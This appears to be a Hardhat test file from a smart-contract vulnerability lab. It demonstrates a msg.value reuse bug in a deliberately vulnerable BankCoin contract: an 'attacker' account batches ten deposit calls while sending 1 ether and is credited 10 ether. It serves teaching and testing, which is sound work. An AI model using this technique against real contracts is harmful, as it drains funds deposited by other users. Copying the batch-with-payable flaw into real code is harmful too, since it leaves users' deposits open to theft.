import { ethers } from 'hardhat'
import { expect } from 'chai'
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import { BankCoin } from '../typechain-types';

const toWei = ethers.utils.parseEther

describe('msg.value reused vulnerability', async function () {
  let attacker: SignerWithAddress
  let user: SignerWithAddress
  let vulnToken: BankCoin
  before(async function () {
    [attacker, user] = await ethers.getSigners()
  })
  beforeEach(async function () {
    const BankCoin = await ethers.getContractFactory('contracts/MsgValueReuse/BankCoin.sol:BankCoin')
    vulnToken = await BankCoin.deploy() as BankCoin
    await vulnToken.connect(user).deposit({ value: toWei('100') });
  })

  it('Attack', async function () {
    const callData = new Array(10).fill(vulnToken.interface.encodeFunctionData("deposit"))
    await vulnToken.connect(attacker).batch(callData, true, { value: toWei('1') }) // only send 1 ether
    expect(await vulnToken.balanceOf(attacker.address)).to.be.equal(toWei('10')) // Can withdraw 10 ether
  })
})